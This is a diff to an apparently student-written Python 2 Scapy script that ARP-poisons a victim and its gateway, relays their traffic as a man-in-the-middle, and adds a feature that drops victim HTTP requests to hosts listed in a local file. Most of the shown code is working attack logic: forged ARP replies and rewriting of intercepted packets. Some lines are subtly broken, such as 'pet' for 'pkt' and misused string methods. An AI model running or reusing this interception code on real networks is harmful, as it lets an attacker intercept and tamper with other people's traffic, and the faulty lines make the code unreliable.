@@ -43,7 +43,7 @@ Victim_mac_addr = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=Victim_IP_addr),ti
 print "--------------------------------------------"
 print "Victim_mac_addr : " +Victim_mac_addr[0][0][1].src
 print "Victim IP Address : " + Victim_IP_addr
-print "--------------------------------------------"
+print "——————————————————————"
 
 Target_mac_addr = Target_mac_addr[0][0][1].src
 Victim_mac_addr= Victim_mac_addr[0][0][1].src
@@ -65,16 +65,41 @@ arpFakeDGW.hwdst=Target_mac_addr
 send(arpFakeVic)
 send(arpFakeDGW)
 
+f = open("/root/Desktop/last/mal_site.txt","r")
+mul_sitelist = []
+for line in f:
+	if line.find('\n'):
+		line = line.strip('\n')
+	if line.find('http://')>-1:
+		line = line.strip('http://')
+	line = line.split('\n')[0]
+	mul_sitelist.append(line)	
+print mul_sitelist
+
+
 def arp_monitor_callback(pkt):
-        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
-		  pkt[Raw].show()
+        #if pkt.haslayer(TCP) and pkt.haslayer(Raw):
+		#pkt[TCP].show()
 			#print pkt[TCP].paylaod
-	if ARP in pkt:
+	if ARP in pet:
                         send(arpFakeVic)
                         send(arpFakeDGW)
                         print "ARP Poison"
         else:
                 if pkt[IP].src==Victim_IP_addr:
+        		if pkt.haslayer(TCP) and pkt.haslayer(Raw):
+				for i in mul_sitelist:
+					print i.encode("hex")
+					pay = pkt[Raw].load
+					pay = pay.split('\n')[1]	
+					if pay.find("Host:")>-1:							
+						pay=pay.split("Host: ")[1]
+						pay=pay.split("\n")[0][:-1]
+						print pay.encode("hex")
+						if pay == i :
+							print 'Drop'
+							return
+
                         pkt[Ether].src = Attacker_Mac_addr
                         pkt[Ether].dst = Target_mac_addr
                         if pkt.haslayer(UDP) == 1:
@@ -105,4 +130,3 @@ def arp_monitor_callback(pkt):
 				print "?????????????????"
 while True:
         sniff(prn=arp_monitor_callback, filter="host "+Target_IP_addr+" or host "+Victim_IP_addr, count=1)
-
